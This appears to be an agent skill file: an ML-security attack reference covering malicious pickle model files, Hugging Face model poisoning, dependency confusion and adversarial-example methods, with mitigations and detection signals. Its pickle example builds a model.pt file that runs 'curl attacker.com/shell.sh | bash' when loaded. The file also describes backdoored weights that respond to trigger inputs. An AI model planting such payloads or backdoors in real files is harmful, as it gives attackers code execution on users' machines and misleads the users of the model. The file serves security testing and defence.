# SKILL: AI/ML Security — Expert Attack Playbook

<!-- zhiyugo:contract:start -->
## ZhiyuGo workflow

Catalog mirror: `role=leaf`, `risk=active`, `default=enabled`. Trusted `policy.json` remains authoritative.

- Restrict activity to the exact TaskSpec scope. Use only bounded registry actions accepted by execution policy; exploitation work is limited to the operator's authorized, evidence-recorded scope.
- Preserve baseline and test ToolResults as Evidence, including errors and negative observations, before drawing a conclusion.
- Treat command examples as reference syntax; actual execution goes through the bounded shell_exec tool when the operator has authorized it.
- Complete only after every success criterion is assessed from cited evidence.

> **Technical reference scope**: Expert AI/ML security techniques. Covers model supply chain attacks (malicious serialization, Hugging Face model poisoning), adversarial examples (FGSM, PGD, C&W, physical-world), training data poisoning, model extraction, data privacy attacks (membership inference, model inversion, gradient leakage), LLM-specific threats, and autonomous agent security. baseline analyses underestimate the severity of pickle deserialization RCE and the practicality of black-box model extraction.

## 1. MODEL SUPPLY CHAIN ATTACKS

### 1.1 Malicious Model Files — Pickle RCE

Python's `pickle` module executes arbitrary code during deserialization. PyTorch `.pt`/`.pth` files use pickle by default.

```python
import pickle
import os

class MaliciousModel:
    def __reduce__(self):
        return (os.system, ('curl attacker.com/shell.sh | bash',))

with open('model.pt', 'wb') as f:
    pickle.dump(MaliciousModel(), f)
```

Loading `torch.load('model.pt')` executes the embedded command. Applies to:

| Format | Risk | Mitigation |
|---|---|---|
| `.pt` / `.pth` (PyTorch) | **Critical** — pickle by default | Use `torch.load(..., weights_only=True)` (PyTorch ≥ 2.0) |
| `.pkl` / `.pickle` | **Critical** — raw pickle | Never load untrusted pickles |
| `.joblib` | **High** — uses pickle internally | Verify provenance |
| `.npy` / `.npz` (NumPy) | **Medium** — `allow_pickle=True` enables RCE | Use `allow_pickle=False` |
| `.safetensors` | **Safe** — tensor-only format, no code execution | Preferred format |
| `.onnx` | **Safe** — graph definition only, no arbitrary code | Preferred for inference |

### 1.2 Hugging Face Model Poisoning

```
Attack vectors:
├── Upload model with pickle-based backdoor to Hub
│   └── Users download via `from_pretrained('attacker/model')`
│       └── pickle deserialization → RCE on load
├── Backdoored weights (no RCE, but biased behavior)
│   └── Model behaves normally except on trigger inputs
│   └── Example: sentiment model returns positive for competitor's products
├── Malicious tokenizer config
│   └── Custom tokenizer code with embedded payload
└── Poisoned training scripts in model repo
    └── `train.py` with obfuscated backdoor
```

**Detection signals:**
- Files with `.pt`/`.pkl` extension instead of `.safetensors`
- Custom Python code in the repository (`*.py` files outside standard config)
- Unusual `config.json` with `trust_remote_code=True` requirement
- Model card lacking provenance, training data description, or eval results

### 1.3 Dependency Confusion in ML Pipelines

ML projects often have complex dependency chains:

```
requirements.txt:
  internal-ml-utils==1.2.3    ← private package
  torch==2.0.0
  transformers==4.30.0

Attack: register "internal-ml-utils" on public PyPI with higher version
→ pip installs attacker's version → arbitrary code in setup.py
```

## 2. ADVERSARIAL EXAMPLES

### 2.1 Attack Taxonomy

| Attack Type | Knowledge | Method |
|---|---|---|
| White-box | Full model access (architecture + weights) | Gradient-based: FGSM, PGD, C&W |
| Black-box (transfer) | Access to similar model | Generate adversarial on surrogate, transfer to target |
| Black-box (query) | API access only | Estimate gradients via finite differences or evolutionary methods |
| Physical-world | Camera/sensor input | Adversarial patches, glasses, modified objects |

### 2.2 FGSM (Fast Gradient Sign Method)

Single-step attack. Fast but less effective against robust models:

```python
epsilon = 0.03  # perturbation budget (L∞ norm)
x_adv = x + epsilon * sign(∇_x L(θ, x, y))
```

Perturbation is imperceptible to humans but changes classification.

### 2.3 PGD (Projected Gradient Descent)

Iterative version of FGSM. Stronger but slower:

```python
x_adv = x
for i in range(num_steps):
    x_adv = x_adv + alpha * sign(∇_x L(θ, x_adv, y))
    x_adv = clip(x_adv, x - epsilon, x + epsilon)  # project back to ε-ball
    x_adv = clip(x_adv, 0, 1)  # valid pixel range
```

### 2.4 C&W (Carlini & Wagner)

Optimization-based. Finds minimal perturbation to cause misclassification:

```
minimize: ||δ||₂ + c · f(x + δ)
where f(x + δ) < 0 iff misclassified
```

Most effective for targeted attacks (force specific wrong class).

### 2.5 Physical-World Adversarial

| Attack | Method | Impact |
|---|---|---|
| Adversarial patch | Printed sticker placed on object | Misclassification of physical objects |
| Adversarial glasses | Special frames with adversarial pattern | Face recognition evasion/impersonation |
| Stop sign perturbation | Small stickers on road signs | Autonomous vehicle misreads sign |
| Adversarial T-shirts | Printed pattern on clothing | Person detection evasion |
| Audio adversarial | Imperceptible audio perturbation | Voice assistant command injection |
